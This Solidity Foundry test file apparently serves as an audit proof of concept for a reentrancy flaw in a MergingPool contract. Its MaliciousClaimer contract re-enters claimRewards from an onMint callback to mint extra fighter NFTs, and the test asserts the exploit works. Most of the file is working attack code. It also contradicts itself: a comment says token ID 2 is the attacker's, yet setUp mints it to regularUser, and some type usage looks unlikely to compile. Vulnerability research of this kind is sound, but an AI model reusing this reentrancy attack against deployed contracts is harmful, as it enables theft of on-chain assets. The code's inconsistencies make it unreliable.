// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Test, console} from "forge-std/Test.sol";
import {MergingPool} from "../../src/MergingPool.sol";
import {FighterFarm} from "../../src/FighterFarm.sol";

// Mock FighterFarm contract for testing
contract MockFighterFarm is FighterFarm {
    mapping(address => uint256) public balances;
    mapping(uint256 => address) public owners;
    uint256 public nextTokenId = 1;
    address public mergingPoolAddress;
    
    constructor() FighterFarm(address(0), address(0), address(0)) {}
    
    function setMergingPoolAddress(address _mergingPoolAddress) external {
        mergingPoolAddress = _mergingPoolAddress;
    }
    
    function mintFromMergingPool(
        address to,
        string calldata modelURI,
        string calldata modelType,
        uint256[2] calldata customAttributes
    ) external override {
        require(msg.sender == mergingPoolAddress, "Not merging pool");
        uint256 tokenId = nextTokenId++;
        owners[tokenId] = to;
        balances[to]++;
        
        // This is where reentrancy can happen if 'to' is a contract
        (bool success, ) = to.call(
            abi.encodeWithSignature("onMint(uint256)", tokenId)
        );
        // Ignore return value to not block minting
    }
    
    function ownerOf(uint256 tokenId) external view override returns (address) {
        return owners[tokenId];
    }
    
    function balanceOf(address owner) external view override returns (uint256) {
        return balances[owner];
    }
}

// Malicious contract that exploits reentrancy
contract MaliciousClaimer {
    MergingPool public mergingPool;
    uint256 public mintCount;
    uint256 public reentrancyCount;
    
    constructor(address _mergingPoolAddress) {
        mergingPool = MergingPool(_mergingPoolAddress);
    }
    
    // Fallback function that triggers reentrancy
    function onMint(uint256 tokenId) external {
        mintCount++;
        
        // Re-enter claimRewards during the first mint to exploit the vulnerability
        if (reentrancyCount < 2) { // Limit reentrancy to avoid infinite loop
            reentrancyCount++;
            string[] memory modelURIs = new string[](1);
            string[] memory modelTypes = new string[](1);
            uint256[2][] memory customAttributes = new uint256[2][](1);
            customAttributes[0] = [uint256(1), uint256(1)];
            
            // Re-enter claimRewards
            mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
        }
    }
    
    function claimRewards() external {
        string[] memory modelURIs = new string[](2);
        string[] memory modelTypes = new string[](2);
        uint256[2][] memory customAttributes = new uint256[2][](2);
        customAttributes[0] = [uint256(1), uint256(1)];
        customAttributes[1] = [uint256(2), uint256(2)];
        
        mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
    }
}

contract ExploitTest is Test {
    MergingPool public mergingPool;
    MockFighterFarm public fighterFarm;
    MaliciousClaimer public maliciousClaimer;
    address public owner;
    address public admin;
    address public regularUser;
    
    function setUp() public {
        owner = address(0x1);
        admin = address(0x2);
        regularUser = address(0x3);
        
        // Deploy contracts
        fighterFarm = new MockFighterFarm();
        mergingPool = new MergingPool(owner, address(0x4), address(fighterFarm));
        
        // Set up the fighter farm to recognize the merging pool
        fighterFarm.setMergingPoolAddress(address(mergingPool));
        
        // Deploy malicious claimer contract
        maliciousClaimer = new MaliciousClaimer(address(mergingPool));
        
        // Set up admin
        vm.prank(owner);
        mergingPool.adjustAdminAccess(admin, true);
        
        // Mint some fighters for testing
        // We'll simulate that token IDs 1, 2, 3 exist and are owned by our test addresses
        vm.prank(address(fighterFarm));
        fighterFarm.mintFromMergingPool(maliciousClaimer, "uri1", "type1", [uint256(1), 1]);
        vm.prank(address(fighterFarm));
        fighterFarm.mintFromMergingPool(regularUser, "uri2", "type2", [uint256(2), 2]);
    }
    
    function testReentrancyExploit() public {
        // Step 1: Admin picks winners for the round
        // The malicious claimer should win 2 fighters (token IDs 1 and 2)
        uint256[] memory winners = new uint256[](2);
        winners[0] = 1; // Token ID 1 owned by maliciousClaimer
        winners[1] = 2; // Token ID 2 owned by maliciousClaimer
        
        vm.prank(admin);
        mergingPool.pickWinner(winners);
        
        // Step 2: Check initial state
        assertEq(fighterFarm.balanceOf(address(maliciousClaimer)), 1, "Initial balance should be 1");
        assertEq(mergingPool.numRoundsClaimed(address(maliciousClaimer)), 0, "Initial rounds claimed should be 0");
        
        // Step 3: Malicious claimer calls claimRewards
        // This should only mint 2 new fighters, but due to reentrancy will mint more
        vm.prank(address(maliciousClaimer));
        maliciousClaimer.claimRewards();
        
        // Step 4: Verify the exploit
        // The malicious claimer should have more than 3 fighters (1 initial + 2 legitimate + extra from reentrancy)
        uint256 finalBalance = fighterFarm.balanceOf(address(maliciousClaimer));
        console.log("Final balance:", finalBalance);
        console.log("Mint count:", maliciousClaimer.mintCount());
        console.log("Reentrancy count:", maliciousClaimer.reentrancyCount());
        
        // The exploit succeeds if the final balance is greater than expected (3)
        assertTrue(finalBalance > 3, "Exploit failed: balance should be greater than 3");
        
        // Verify that numRoundsClaimed was updated correctly
        assertEq(mergingPool.numRoundsClaimed(address(maliciousClaimer)), 1, "Should have claimed 1 round");
    }
    
    function testNormalClaimingWorks() public {
        // Test that normal (non-reentrant) claiming works correctly
        
        // Step 1: Admin picks winners
        uint256[] memory winners = new uint256[](1);
        winners[0] = 2; // Token ID 2 owned by regularUser
        
        vm.prank(admin);
        mergingPool.pickWinner(winners);
        
        // Step 2: Regular user claims rewards (no reentrancy)
        string[] memory modelURIs = new string[](1);
        string[] memory modelTypes = new string[](1);
        uint256[2][] memory customAttributes = new uint256[2][](1);
        customAttributes[0] = [uint256(1), 1];
        
        vm.prank(regularUser);
        mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
        
        // Step 3: Verify correct behavior
        assertEq(fighterFarm.balanceOf(regularUser), 2, "Regular user should have 2 fighters");
        assertEq(mergingPool.numRoundsClaimed(regularUser), 1, "Should have claimed 1 round");
    }
}